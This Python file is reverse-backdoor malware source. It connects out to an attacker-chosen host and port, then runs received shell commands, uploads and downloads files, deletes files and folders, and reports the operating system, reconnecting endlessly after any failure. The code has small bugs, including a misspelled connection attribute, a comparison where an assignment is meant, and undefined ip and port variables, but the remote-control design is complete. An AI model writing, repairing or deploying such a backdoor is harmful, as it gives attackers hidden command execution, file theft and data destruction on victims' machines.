# coding reverse backdoor in python 
# the main function is to let the user try to connect to us instead to we trying to coonnect to user

# ------------------------------- start of code -----------------------------

import os
import sys
import json
import socket
import base64
import subprocess

class Suspicious:
    def __init__(self, ip, port):
        self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        # self.connetion.send("[+] Connection Success.\n".encode('utf-8'))
        # platform = {'aix': "AIX", 'linux': "Linux", 'win32':'Windows', 'cygwin': "Windows.Cygwin", 'darwin': "MacOS"}
        # self.connetion.send(f"[+] Connected to {platform[sys.platform]} operating system")

    def execute_system_commands(self, command):
        # the output data type of the check_output method is byte
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
        except:
            return "------- [=] Error while executing the command [=] ------"

    def changeWorkingDirectory(self, path):
        os.chdir(path)
        return "[+] Changed current working folder to " + str(path)

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def download_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] File upload success"

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.connetion.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def send_data(self, data):
        json_data = json.dumps(data)
        self.connetion.send(json_data.encode('utf-8'))
    
    def getSystemInfo(self):
        platform = {'aix': 'AIX', 'linux':"Linux", 'win32': 'Windows', 'cygwin': 'Windows/Cygwin', 'darwin': 'macOs'}
        return f"[+] Connected to \"{platform[sys.platform]}\" operating system"

    def delete_items(self, path):
        try:
            import shutil
            if os.path.isfile(path):
                os.remove(path)
                return "[=] File delete successful"
            elif os.path.isdir(path):
                shutil.rmtree(path)
                return "[=] Folder delete successful"
        except Exception as error:
            return str(error)

    def start(self):
        while True:
            try:
                data_received = self.receive_data()
                if data_received[0].lower() == 'exit':
                    self.connetion.close()
                    sys.exit()
                elif data_received[0] == 'what':
                    command_result = self.getSystemInfo()
                elif data_received[0].lower() == 'cd' and len(data_received) >1:
                    command_result = self.changeWorkingDirectory(data_received[1])
                elif data_received[0].lower() == 'download':
                    command_result = self.read_file(data_received[1]).decode()
                elif data_received[0].lower() == 'upload':
                    command_result = self.download_file(data_received[-2], data_received[-1])
                elif data_received[0] == 'delete':
                    command_result == self.delete_items(data_received[1])
                else:
                    command_result = self.execute_system_commands(data_received)
                self.send_data(command_result)
            # except subprocess.CalledProcessError as error:
                # self.send_data("-------[=] Error => subprocess.CalledProcessError [=] -------")
            except Exception as error:
                self.send_data("---- [=] Error while executing command [=] ----")
                # self.send_data("---- [=] Connection is still intact though [=] ----")

# these ip and port values are of hackers system values
while True:
    try:
        backdoor = Suspicious(ip, port)
        backdoor.start()
    except:
        continue